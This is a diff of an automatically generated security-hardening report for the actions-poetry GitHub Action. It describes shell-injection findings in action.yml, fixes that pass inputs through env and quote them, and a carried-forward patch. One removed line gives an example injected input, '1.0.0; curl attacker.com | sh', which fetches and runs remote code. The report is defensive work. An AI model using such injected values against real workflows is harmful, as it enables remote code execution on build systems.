@@ -4,19 +4,19 @@
 
 > This file was generated automatically by the hardening agent.
 
-**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`
+**Policy SHA:** `374911c4be584df24e6da57af2d990570ef0f859`
 
 **Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`
 
 **Harden Agent Version:** `2`
 
-Action **abatilo--actions-poetry/v3.0.2** was hardened automatically. 8 finding(s) were identified and resolved across 1 iteration(s).
+Action **abatilo--actions-poetry/v3.0.2** was hardened automatically. 5 finding(s) were identified and resolved across 1 iteration(s).
 
 ## Findings Fixed
 
 ### script-injection (severity: high)
 
-Rule (a): `${{ inputs.poetry-version }}` is directly interpolated inside a `run:` shell command string on line 33 of action.yml: `pipx install poetry==${{ inputs.poetry-version }}`. An attacker-controlled input value is substituted directly into the shell command before the shell ever sees it, enabling arbitrary command injection (e.g. a value like `1.0.0; curl attacker.com | sh`).
+Sub-rule (a): the step puts an expression directly into the run: script: `pipx install poetry==${{ inputs.poetry-version }}`. Someone who controls the poetry-version input can inject shell commands. Fix: pass it through env (e.g. POETRY_VERSION: ${{ inputs.poetry-version }}) and quote it: `pipx install "poetry==$POETRY_VERSION"`.
 
 Locations:
 
@@ -24,47 +24,12 @@ Locations:
 
 ### script-injection (severity: high)
 
-Rule (a) and (b): On line 37 of action.yml, `${{ inputs.poetry-plugins }}` is directly interpolated inside a `run:` shell command string: `ALL_PLUGINS=$(echo "${{ inputs.poetry-plugins }}")`. This is a direct expression interpolation (rule a). Additionally, on line 39, the derived shell variable `$PLUGIN` (populated from the untrusted input) is used unquoted in `poetry self add $PLUGIN`, allowing shell metacharacter injection (rule b).
+Sub-rule (a): the step puts an expression directly into the run: script: `ALL_PLUGINS=$(echo "${{ inputs.poetry-plugins }}")`. A value containing quotes or $(...) breaks out and runs arbitrary commands. Sub-rule (b) also applies: the untrusted value expands unquoted later, in `for PLUGIN in $ALL_PLUGINS` and `poetry self add $PLUGIN`. Fix: pass the input through env, split it safely (e.g. read -ra into an array with globbing turned off), and quote each "$PLUGIN".
 
 Locations:
 
 - `action.yml:37`
 - `action.yml:39`
-
-### unpinned-uses (severity: high)
-
-Multiple `uses:` references in ci.yml are pinned to mutable tags or branch names instead of immutable 40-character SHA digests, making the workflow vulnerable to supply-chain attacks if those tags are moved or overwritten: `actions/checkout@v4` (line 14), `actions/setup-python@v5` (line 15), `actions/checkout@master` (line 33), `actions/setup-node@v4` (line 35).
-
-Locations:
-
-- `.github/workflows/ci.yml:14`
-- `.github/workflows/ci.yml:15`
-- `.github/workflows/ci.yml:33`
-- `.github/workflows/ci.yml:35`
-
-### unpinned-uses (severity: high)
-
-`uses: amannn/action-semantic-pull-request@v5.4.0` in lint-pr.yml is pinned to a mutable version tag rather than an immutable 40-character SHA digest, making the workflow vulnerable to supply-chain attacks.
-
-Locations:
-
-- `.github/workflows/lint-pr.yml:12`
-
-### missing-permissions (severity: medium)
-
-ci.yml has no top-level `permissions:` key and none of its jobs (ci, ci-all, release) define job-level `permissions:` blocks. This means the workflow runs with the default (potentially broad) GitHub token permissions.
-
-Locations:
-
-- `.github/workflows/ci.yml:1`
-
-### missing-permissions (severity: medium)
-
-lint-pr.yml has no top-level `permissions:` key and its only job (`main`) has no job-level `permissions:` block. This means the workflow runs with the default (potentially broad) GitHub token permissions.
-
-Locations:
-
-- `.github/workflows/lint-pr.yml:1`
 
 ### static-inline-injection (severity: high)
 
@@ -82,28 +47,59 @@ Locations:
 
 - `action.yml:37`
 
+### prior-fix (severity: high)
+
+Carried forward from this version's previous harden, which fixed it; fix it again unless the code no longer has the problem. The previous harden changed action.yml without recording a finding for it, and this analysis reported nothing there. Re-apply its security changes unless the code no longer needs them. The previous patch:
+```diff
+diff --git a/action.yml b/action.yml
+index 32d4bed..5014cdd 100644
+--- a/action.yml
++++ b/action.yml
+@@ -16,6 +16,23 @@ inputs:
+ runs:
+   using: "composite"
+   steps:
+     - run: |
+         python3 -m pip install --user pipx
+         python3 -m pipx ensurepath
+@@ -29,13 +46,19 @@ runs:
+         pipx install git+https://github.com/python-poetry/poetry.git@main
+       shell: bash
+     - if: ${{ inputs.poetry-version != 'latest' && inputs.poetry-version != 'main' }}
++      env:
++        POETRY_VERSION: ${{ inputs.poetry-version }}
+       run: |
+-        pipx install poetry==${{ inputs.poetry-version }}
++        pipx install "poetry==$POETRY_VERSION"
+       shell: bash
+     - if: ${{ inputs.poetry-plugins != '' }}
++      env:
++        POETRY_PLUGINS: ${{ inputs.poetry-plugins }}
+       run: |
+-        ALL_PLUGINS=$(echo "${{ inputs.poetry-plugins }}")
+-        for PLUGIN in $ALL_PLUGINS; do
+-          poetry self add $PLUGIN
++        plugins=()
++        while IFS= read -r -d '' t; do plugins+=("$t"); done \
++          < <(printf '%s' "$POETRY_PLUGINS" | xargs printf '%s\0')
++        for PLUGIN in "${plugins[@]}"; do
++          poetry self add "$PLUGIN"
+         done
+       shell: bash
+
+```
+
+Locations:
+
+- `action.yml`
+
 ## Iteration Notes
 
 ### Iteration 1
 
-**Fixes applied:** script-injection, static-inline-injection, unpinned-uses, missing-permissions
+**Fixes applied:** script-injection, static-inline-injection, prior-fix
 
 **Notes:**
 
-Fixed all 8 findings across 3 files:
-
-1. action.yml (script-injection / static-inline-injection):
-   - Moved `${{ inputs.poetry-version }}` to env: block as POETRY_VERSION; used as `"poetry==$POETRY_VERSION"` in shell.
-   - Moved `${{ inputs.poetry-plugins }}` to env: block as POETRY_PLUGINS; used xargs-based NUL-delimited tokenization into a bash array, then quoted each plugin in `poetry self add "$PLUGIN"`.
-
-2. .github/workflows/ci.yml (unpinned-uses + missing-permissions):
-   - Pinned actions/checkout@v4 → SHA 11d5960a...
-   - Pinned actions/setup-python@v5 → SHA a26af69b...
-   - Pinned actions/checkout@master → SHA 61b9e375...
-   - Pinned actions/setup-node@v4 → SHA 49933ea5...
-   - Added top-level `permissions: {}` and per-job permissions (contents:read for ci, {} for ci-all, contents:write for release).
-
-3. .github/workflows/lint-pr.yml (unpinned-uses + missing-permissions):
-   - Pinned amannn/action-semantic-pull-request@v5.4.0 → SHA e9fabac3...
-   - Added top-level `permissions: {}` and job-level `pull-requests: read`.
+Moved inputs.poetry-version into POETRY_VERSION and quoted it: pipx install "poetry==$POETRY_VERSION". Moved inputs.poetry-plugins into POETRY_PLUGINS. The list is now split on whitespace and newlines into an array with `read -r -d '' -a` behind an empty-value guard, and each plugin is quoted: "$PLUGIN". This split is a deliberate change from the previous harden's patch. That patch used xargs, which honors quotes, so plugin names would have been split differently from upstream, and an unmatched quote would have dropped every plugin after it. The new split matches upstream's unquoted $ALL_PLUGINS, except that it doesn't glob, so a plugin spec containing `*` or `?` is no longer expanded against filenames. Nothing was run or tested.
 
